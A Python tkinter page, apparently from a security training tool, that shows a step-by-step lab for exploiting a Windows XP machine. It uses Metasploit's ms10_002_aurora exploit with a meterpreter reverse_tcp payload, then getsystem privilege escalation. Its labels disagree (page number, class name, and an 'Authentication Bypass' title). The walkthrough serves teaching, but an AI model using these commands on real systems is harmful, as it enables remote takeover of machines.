## ATTACK VECTOR 2 PAGE ##

import tkinter as tk  # python 3
from tkinter import font as tkfont  # python 3
# import Tkinter as tk     # python 2
# import tkFont as tkfont  # python 2

from tkinter import font as tkfont
from tkinter import *
from tkinter import font, messagebox
import random, requests, os, sys
import PySimpleGUI as sg
from nav_bar import *
from subprocess import call, Popen, PIPE
import os


class AttackVectorNine(tk.Frame):

    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.controller = controller
        framefont = tkfont.Font(family='Calibri', size=33, weight="bold")

        main_frame = tk.Frame(self)

        highlightFont = font.Font(family='Calibri', size=18)

        global priv_escalation

        priv_escalation = tk.PhotoImage(file='resources/priv_escalation.png')

        def hint():
            messagebox.showinfo("Hint",
                                "You need to choose the appropriate Windows version with chosen exploit. For this attack, we will test on machine running Windows XP.")

        def load_terminal():
            p1 = Popen("exo-open --launch TerminalEmulator", stdout=PIPE, universal_newlines=True, shell=True).stdout

        def change_to_Step1():
            text = (
                "\nStep 1: On Windows machine (remote system)\n\n"
                "o   Open Command Prompt.\n\n"
                "o   Discover IP address of target machine. Type command:\n"
                "     ipconfig\n"

            )
            step1frame = tk.Message(main_frame, text=text, font=('OpenSans', 14), anchor='nw',
                                    aspect=300)
            step1frame.place(rely=0.2, relx=0.2, relheight=1, relwidth=1)
            hintButton = ttk.Button(step1frame, text="Hint", style='Accent.TButton', command=hint).place(rely=0.2, relx=0.02, relheight=0.05, relwidth=0.1)

        def change_to_Step2():
            text = (
                "\nStep 2: Use Kali Linux virtual machine to launch the attack tool\n\n"
                "o   Click on 'Terminal button'\n\n"
                "o   Type command msfconsole to execute Metasploit\n\n"
                "o   Type command search aurora\n\n"
                "o   In order to use aurora option, type command:\n"
                "     use exploit/windows/browser/ms10_002_aurora\n\n"
                "o   Set the payload, type command:\n"
                "     set payload windows/meterpreter/reverse_tcp\n\n"
                "o   Check the payload options, type command:\n"
                "     show options\n\n"
                "o   Set SRVHOST (your IP address)\n\n"
                "o   Set URIPATH /\n\n"

            )
            step2frame = tk.Message(main_frame, text=text, font=('OpenSans', 14), anchor='nw',
                                    aspect=300)
            step2frame.place(rely=0.2, relx=0.2, relheight=1, relwidth=1)
            terminalButton = ttk.Button(step2frame, text="Terminal", style='Accent.TButton',
                                       command=load_terminal).place(rely=0.5, relx=0.02, relheight=0.05,
                                                                                   relwidth=0.1)

        def change_to_Step3():
            text = (
                "\nStep 3: Conduct to exploit the target machine and gain the system privilege with GETSYSTEM\n\n"
                "o   After determining the LHOST and RHOST. To attack the victim machine, type command:\n"
                "     exploit\n\n"
                "o   Copy and run the URL on Internet Explorer via Windows xp system\n\n"
                "o   Check the output in terminal:\n"
                "     => meterpreter session was opened\n\n"
                "o   Escalate the privilege, type command:\n"
                "     getsystem\n\n"
                "o   Show running processes of the victim system, type command:\n"
                "     ps\n\n"

            )
            step3frame = tk.Message(main_frame, text=text, font=('OpenSans', 14), anchor='nw',
                                    aspect=300)
            step3frame.place(rely=0.2, relx=0.2, relheight=1, relwidth=1)
            
        def create_step_button(step_num, command):
            button = ttk.Button(main_frame, text="Step " + str(step_num), style='Accent.TButton',
                               command=command).place(rely=0.25 + 0.1 * step_num, relx=0.04,
                                                                     relheight=0.05, relwidth=0.1)

        tkfont.Font(family='OpenSans', size=13)
        framefont = tkfont.Font(family='Arial Rounded MT Bold', size=28, weight='bold')

        title_label = tk.Label(self, text="Authentication Bypass", bg='white', fg='#92CEFF', anchor="c", font=framefont)
        title_label.place(rely=0.06, relheight=0.12, relwidth=1)
        
        # creates blue bar as canvas below nav bar
        title_canvas = tk.Canvas(self, bg='#c8e6ff', highlightthickness=0)
        title_canvas.place(rely=0.08, relheight=0.004, relwidth=1)

        # creates blue bar as canvas below title
        title_canvas = tk.Canvas(self, bg='#c8e6ff', highlightthickness=0)
        title_canvas.place(rely=0.155, relheight=0.004, relwidth=1)

        allscreenframe = tk.Label(main_frame, bg='white')
        allscreenframe.place(rely=0.2, relheight=1, relwidth=1)

        sidescreenframe = tk.Label(main_frame, text="\n            Steps:", bg='white', fg='#92CEFF', font='calibri 20 bold',
                                   anchor='nw')
        sidescreenframe.place(rely=0.25, relheight=1, relwidth=0.2)

        create_step_button(1, change_to_Step1)
        create_step_button(2, change_to_Step2)
        create_step_button(3, change_to_Step3)
        
        priv_escalation_label = tk.Label(main_frame, image=priv_escalation)
        priv_escalation_label.place(rely=0.36, relx=0.4)

        display_nav_bar(self, controller)
        main_frame.pack(fill='both', expand=1)
